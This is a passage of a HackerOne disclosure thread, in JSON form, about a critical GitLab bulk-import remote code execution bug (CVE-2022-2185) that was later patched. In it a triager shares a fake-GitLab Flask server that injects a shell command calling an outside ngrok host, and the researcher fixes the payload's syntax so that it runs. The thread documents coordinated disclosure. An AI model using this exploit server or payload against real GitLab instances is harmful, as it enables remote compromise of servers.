Uc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=80c33b4bc16d205c4c667b912053552016af3f73d43dcfe16d11cab60eb7ff9a"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17314359,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@vakzz \n\nThis is the code we are using:\n\n```\nfrom flask import Flask, request, Response, send_file, jsonify\nimport requests\nimport json\n​\nCOMMAND = \";curl http://xxx.in.ngrok.io/mostdefnotanadmin;\"\n​\nwith open(\"IntrospectionQuery.json\") as f:\n    IntrospectionQueryResult = json.load(f)\n​\nHTTP_METHODS = [\n    \"GET\",\n    \"HEAD\",\n    \"POST\",\n    \"PUT\",\n    \"DELETE\",\n    \"CONNECT\",\n    \"OPTIONS\",\n    \"TRACE\",\n    \"PATCH\",\n]\napp = Flask(__name__)\n​\n​\n@app.before_request\ndef log_request():\n    app.logger.debug(\"Request Path %s\", request.path)\n    app.logger.debug(\"Request Data %s\", request.data)\n    return None\n​\n​\n@app.route(\"/api/v4/version\")\ndef version():\n    return jsonify({\"version\": \"15.1.0-ee\", \"revision\": \"31c24d2d864\"})\n​\n​\n@app.route(\"/api/v4/groups\")\ndef groups():\n    return jsonify(\n        [\n            {\n                \"id\": 18,\n                \"name\": \"evil-group\",\n                \"path\": \"evil-group\",\n                \"full_name\": \"evil-group\",\n                \"full_path\": \"evil-group\",\n            }\n        ]\n    )\n​\n​\n@app.route(\"/api/graphql\", methods=[\"POST\"])\ndef graphql():\n    if b\"query IntrospectionQuery\" in request.data:\n        app.logger.debug(\"IntrospectionQuery\")\n        return jsonify(IntrospectionQueryResult)\n​\n    elif b\"metadata {\\\\n    version\" in request.data:\n        app.logger.debug(\"version query\")\n        return jsonify({\"data\": {\"metadata\": {\"version\": \"15.1.0-ee\"}}})\n​\n    elif b\"($full_path: ID!) {\\\\n  group(fullPath\" in request.data:\n        app.logger.debug(\"group query\")\n        return jsonify(\n            {\n                \"data\": {\n                    \"group\": {\n                        \"name\": \"evil-group\",\n                        \"path\": \"evil-group\",\n                        \"full_path\": \"evil-group\",\n                    }\n                }\n            }\n        )\n​\n    elif b\"projects(includeSubgroups: false\" in request.data:\n        app.logger.debug(\"projects query\")\n        return jsonify(\n            {\n                \"data\": {\n                    \"group\": {\n                        \"projects\": {\n                            \"page_info\": {\n                                \"next_page\": \"eyJpZCI6IjIyIn0\",\n                                \"has_next_page\": False,\n                            },\n                            \"nodes\": [\n                                {\"name\": \"evil-project\", \"full_path\": \"evil-group/evil-project\"}\n                            ],\n                        }\n                    }\n                }\n            }\n        )\n    elif b\"($full_path: ID!) {\\\\n  project(fullPath: $full_path)\" in request.data:\n        app.logger.debug(\"project query\")\n        return jsonify(\n            {\n                \"data\": {\n                    \"project\": {\n                        \"template_name\": \"rails\",\n                        \"import_source\": COMMAND,\n                    }\n                }\n            }\n        )\n    return jsonify({})\n​\n​\n@app.route(\"/api/v4/groups/evil-group/export_relations\", methods=[\"POST\"])\ndef group_export_relations():\n    return jsonify({\"message\": \"202 Accepted\"}), 202\n​\n​\n@app.route(\"/api/v4/projects/evil-group/evil-project/export_relation\", methods=[\"POST\"])\ndef project_export_relations():\n    return jsonify({\"message\": \"202 Accepted\"}), 202\n​\n​\n@app.route(\"/api/v4/groups/export_group/export_relations/status\", methods=[\"GET\"])\ndef group_export_relations_status():\n    return jsonify([])\n​\n​\n@app.route(\"/api/v4/projects/evil-group/evil-project/export_relations/status\", methods=[\"GET\"])\ndef project_export_relations_status():\n    return jsonify([])\n​\n​\n@app.route(\"/\", defaults={\"path\": \"\"}, methods=HTTP_METHODS)\n@app.route(\"/<path:path>\", methods=HTTP_METHODS)\ndef proxy(path):\n    return jsonify({})\n```\n\nWe have modified it to match our groups. And it's importing right away without failing and we are not seeing the curl command on our ngrok server.\n\nThanks,\nVitor",
      "automated_response": false,
      "created_at": "2022-06-28T09:55:25.659Z",
      "updated_at": "2022-06-28T09:55:25.659Z",
      "actor": {
        "username": "vdesousa",
        "cleared": false,
        "verified": false,
        "url": "/vdesousa",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17320026,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @vdesousa,\n\n> And it's importing right away without failing and we are not seeing the curl command on our ngrok server.\n\nThe project is imported right away or the group? I'm not sure how the project would be imported as the fake server shouldn't provide enough data to create a successful import. If you visit `/import/bulk_imports/history` you should see something like this (with the project pipeline steps not the group):\n{F1799086}\n\nAlso I just noticed that the the `COMMAND` has to end with a `#` or similar to make the final command a valid shell script when it is put into the gzip string, I think your current command will not execute as it has invalid syntax:\n```bash\nvagrant@gitlab:~$ bash -c 'gzip -dc ;curl http://xxx.in.ngrok.io/mostdefnotanadmin; | wc -c'\nbash: -c: line 0: syntax error near unexpected token `|'\nbash: -c: line 0: `gzip -dc ;curl http://xxx.in.ngrok.io/mostdefnotanadmin; | wc -c'\n\nvagrant@gitlab:~$ bash -c 'gzip -dc ;curl http://xxx.in.ngrok.io/mostdefnotanadmin;# | wc -c'\ngzip: compressed data not read from a terminal. Use -f to force decompression.\nFor help, type: gzip -h\n<a href=\"https://xxx.in.ngrok.io/mostdefnotanadmin\">Temporary Redirect</a>.\n```\n\nI added a `web_url` and changed the `id` in the groups method so that it could be re-imported (I had another import stuck) but don't think that changes anything, otherwise I tried with your code with a `#` at the end of the command and the payload was executed after the project import failed.\n\n```python\n@app.route(\"/api/v4/groups\")\ndef groups():\n    return jsonify(\n        [\n            {\n                \"id\": 1231231,\n                \"name\": \"evil-group\",\n                \"path\": \"evil-group\",\n                \"full_name\": \"evil-group\",\n                \"full_path\": \"evil-group\",\n                \"web_url\": \"https://a.com/evil-group1\",\n            }\n        ]\n    )\n```\n\nIf none of that works then I am unsure why it is not working for you locally, but you should be able to follow the steps exactly in https://hackerone.com/reports/1609965#activity-17313117 and see that if affects gitlab.com so maybe something changed on master?\n\nCheers,\nWill",
      "automated_response": false,
      "created_at": "2022-06-28T11:16:35.559Z",
      "updated_at": "2022-06-28T11:16:35.559Z",
      "actor": {
        "username": "vakzz",
        "cleared": true,
        "verified": true,
        "url": "/vakzz",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=80c33b4bc16d205c4c667b912053552016af3f73d43dcfe16d11cab60eb7ff9a"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 1799086,
          "filename": "history.jpg",
          "type": "image/jpeg",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/o4roeadz5d7i2zj2ep9728egxci4?response-content-disposition=attachment%3B%20filename%3D%22history.jpg%22%3B%20filename%2A%3DUTF-8%27%27history.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e72ee104a63ce152b7f9cdc9ee18e160841687db3bda093d20ad4501a0ddba54"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17345248,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugPendingProgramReview",
      "message": "",
      "automated_response": false,
      "created_at": "2022-06-29T09:49:54.726Z",
      "updated_at": "2022-06-29T09:49:54.726Z",
      "actor": {
        "username": "h1_analyst_robert",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_robert",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/zx18sqg0dqy4039yhin3qc2z1xo1/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%228801910063134.png%22%3B%20filename%2A%3DUTF-8%27%278801910063134.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ea65779ee91967c905129c980832718417594576ce757b4d41e98de25e8910b3"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17348325,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "Hello @vakzz ,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team. We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/366088. This issue will be made public 30 days following the release of a patch.\n\nGiven the severity of the report, we are paying an initial $1000 on triage. Congratulations!\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2022-06-29T14:08:13.349Z",
      "updated_at": "2022-06-29T14:08:13.349Z",
      "actor": {
        "username": "vdesousa",
        "cleared": false,
        "verified": false,
        "url": "/vdesousa",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17348336,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "",
      "automated_response": false,
      "created_at": "2022-06-29T14:08:31.872Z",
      "updated_at": "2022-06-29T14:08:31.872Z",
      "actor": {
        "url": "/gitlab",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "GitLab"
        }
      },
      "bounty_amount": "1000.0",
      "bonus_amount": "0.0",
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "gitlab",
      "collaborator": {
        "username": "vakzz",
        "url": "/vakzz"
      }
    },
    {
      "id": 17358436,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "ETA for fix:\n\nHi @vakzz,\n\nThe issue you reported is currently scheduled to be fixed by 2022-07-31.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n",
      "automated_response": true,
      "created_at": "2022-06-30T04:03:56.219Z",
      "updated_at": "2022-06-30T04:03:56.219Z",
      "actor": {
        "username": "gitlab-securitybot",
        "cleared": false,
        "verified": false,
        "url": "/gitlab-securitybot",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17394488,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hey @vakzz,\n\nYour finding has been patched in GitLab version 15.1.1, assigned CVE-2022-2185, we are awarding a bounty. Congratulations!\n\nThe CVSS for this was agreed by the AppSec team as being [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H](https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/#vector=CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H&range=new) (9.9 Critical / $33,510.00 / new bounty range), and we awarded a partial bounty of $1000 when we triaged it.\n\nGreat work on this report, and thank you very much for modifying your scripts & steps to reproduce so we could validate the issue. It's always a real pleasure working with you.\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker. If you'd like to publicly disclose this report or details of it in a blog post or elsewhere, please allow 30 days to pass before doing so to give time to our customers to upgrade to a patched version.\n\nWe look forward to your next report! (Seriously - we do! 😅)\n\nBest regards,\nNick Malcolm\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2022-07-03T21:18:48.545Z",
      "updated_at": "2022-07-03T21:18:48.545Z",
      "actor": {
        "username": "nmalcolm_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/nmalcolm_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/qugqy57v49704ukw2816cro62zrc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17394491,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "https://gitlab.com/gitlab-com/gl-security/security-department-meta/-/issues/1377#note_1009862265",
      "automated_response": false,
      "created_at": "2022-07-03T21:19:32.856Z",
      "updated_at": "2022-07-03T21:19:32.856Z",
      "actor": {
        "url": "/gitlab",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "GitLab"
        }
      },
      "bounty_amount": "32510.0",
      "bonus_amount": "0.0",
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "gitlab",
      "collaborator": {
        "username": "vakzz",
        "url": "/vakzz"
      }
    },
    {
      "id": 17394492,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportSeverityUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2022-07-03T21:19:45.448Z",
      "updated_at": "2022-07-03T21:19:45.448Z",
      "additional_data": {
        "old_severity": "Critical (9.9)",
        "new_severity": "Critical (9.9)",
        "old_severity_id": 1552521,
        "new_severity_id": 1568110
      },
      "actor": {
        "username": "nmalcolm_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/nmalcolm_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/qugqy57v49704ukw2816cro62zrc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17394495,
      "is_internal": false,
      "editable": false,
      "type": "Activities::CveIdAdded",
      "message": "",
      "automated_response": false,
      "created_at": "2022-07-03T21:20:07.307Z",
      "updated_at": "2022-07-03T21:20:07.307Z",
      "cve_ids": [
        "CVE-2022-2185"
      ],
      "actor": {
        "username": "nmalcolm_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/nmalcolm_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/qugqy57v49704ukw2816cro62zrc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17394497,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "",
      "automated_response": false,
      "created_at": "2022-07-03T21:20:19.203Z",
      "updated_at": "2022-07-03T21:20:19.203Z",
      "actor": {
        "username": "nmalcolm_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/nmalcolm_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/qugqy57v49704ukw2816cro62zrc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "vakzz",
        "url": "/vakzz"
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17857812,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2022-08-05T07:30:40.208Z",
      "updated_at": "2022-08-05T07:30:40.208Z",
      "first_to_agree": true,
      "actor": {
        "username": "vakzz",
        "cleared": true,
        "verified": true,
        "url": "/vakzz",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=80c33b4bc16d205c4c667b912053552016af3f73d43dcfe16d11cab60eb7ff9a"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 18350817,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "Hey @vakzz,\n\nSorry for missing your disclosure request. Agreed! I'm also looping back on the issue itself to redact some info and then we can make that public too.\n\nCheers,\nNick Malcolm\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2022-09-13T04:40:51.920Z",
      "updated_at": "2022-09-13T04:40:51.920Z",
      "actor": {
